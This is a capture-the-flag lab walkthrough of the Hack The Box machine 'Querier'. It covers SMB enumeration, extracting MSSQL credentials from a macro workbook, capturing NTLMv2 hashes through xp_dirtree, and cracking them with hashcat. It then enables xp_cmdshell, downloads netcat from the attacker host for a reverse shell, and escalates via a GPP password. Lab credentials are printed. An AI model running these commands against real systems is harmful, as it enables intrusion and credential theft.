---
icon: windows
---

# Querier - Medium

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/querier"><strong>Querier</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.125 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 18:44 EST
Nmap scan report for 10.10.10.125
Host is up (0.053s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2025-11-28T23:46:11+00:00; +1s from scanner time.
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-28T23:42:58
|_Not valid after:  2055-11-28T23:42:58
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/28%OT=135%CT=1%CU=32697%PV=Y%DS=2%DC=T%G=Y%TM=692A3
OS:443%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%T
OS:S=U)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=109%GCD=1%I
OS:SR=107%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=FA%GCD=1%ISR=10E%TI=I%CI=I%II=I%S
OS:S=S%TS=U)SEQ(SP=FD%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M542NW8
OS:NNS%O2=M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS)WIN(
OS:W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF
OS:%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%R
OS:D=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-28T23:46:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   90.65 ms 10.10.16.1
2   23.62 ms 10.10.10.125
```

### <mark style="color:$primary;">SMB Enumeration</mark>

```shellscript
smbclient -N -L \\\\10.10.10.125\\
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There is an interesting share let's check it out

```shellscript
smbclient -N \\\\10.10.10.125\\Reports
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Found an .xlms which is a Microsoft Excel workbook with macros. You can check the file on Windows or on Linux with olevba

{% embed url="https://github.com/decalage2/oletools/wiki/Install" %}

```shellscript
olevba Currency\ Volume\ Report.xlsm
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There is a username and password being leaked in the file for MSSQL!

```bash
reporting:PcwTWTHRwryjc$c6
```

### <mark style="color:$primary;">MSSQL Enumeration</mark>

Let's connect to mssql and check our permissions

```bash
impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
```

```shellscript
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

okay let's check out the databases;

```bash
SELECT name FROM master.sys.databases;
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

let's look for user generated tables on those databases

```shellscript
SQL (QUERIER\reporting  reporting@volume)> use volume
ENVCHANGE(DATABASE): Old Value: volume, New Value: volume
INFO(QUERIER): Line 1: Changed database context to 'volume'.
SQL (QUERIER\reporting  reporting@volume)> SELECT name FROM sysobjects WHERE xtype = 'U'
name   
----  
```

Nothing interesting

### <mark style="color:$primary;">Capturing NTLMv2 Hash \[xp\_dirtree]</mark>

We can use xp\_dirtree to load a file and I'll tell the db that the file is in an SMB share on my machine. The server will try to authenticate. Where I will have responder ready to capture the credentials!

```bash
sudo responder -I tun0
```

```shellscript
EXEC xp_dirtree "\\10.10.16.2\test";
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now check responder you should see a hash

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Save it to a file and let's try and crack it using hashcat.

### <mark style="color:$primary;">Crack NTMLv2 Hash</mark>

```bash
hashcat mssql-svc.hash /usr/share/wordlists/rockyou.txt
```

```shellscript
hashcat mssql-svc.hash /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Managed to crack it and get mssql-svc password

```shellscript
mssql-svc:corporate568
```

Hopefully this account will give us more permission over the MSSQL DB.

### <mark style="color:$primary;">MSSQL as msql-svc</mark>

```shellscript
impacket-mssqlclient mssql-svc:'corporate568'@10.10.10.125 -windows-auth
```

```bash
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

From the start we already have a lot more permissions on the machine compare to before

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Not enought to run xp\_cmdshell. But we can enable it with our current permissions.

Run the following commands to enable it:

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we can run commands on the system. Let's transfer nc64.exe to the system and get a shell. I'll use a simple python server to host the file

{% code overflow="wrap" %}
```bash
EXECUTE xp_cmdshell "powershell (wget 10.10.16.2/nc64.exe -O c:/windows/temp/nc64.exe)";
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Make sure you have a listener ready on your designated port before running the below command:

```shellscript
EXECUTE xp_cmdshell "C:\windows\temp\nc64.exe 10.10.16.2 135 -e powershell.exe";
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we got a shell on the system!

## <mark style="color:blue;">Privilege Escalation</mark>

I'll first download PowerUp.ps1 on the machine

```shellscript
wget http://10.10.16.2/PowerUp.ps1 -O PowerUp.ps1
```

Now load the funciton and run Invoke-AllChecks

```shellscript
. .\PowerUp.ps1
```

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The script managed to find the GPP password file with the administrator credentials!

```shellscript
Administrator:MyUnclesAreMarioAndLuigi!!1!
```

<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There is no one in the Remote Management Users group so we can't use evil-winrm to login I'll use impacket-psexec

```shellscript
impacket-psexec administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
```

<figure><img src="../../.gitbook/assets/image (19) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
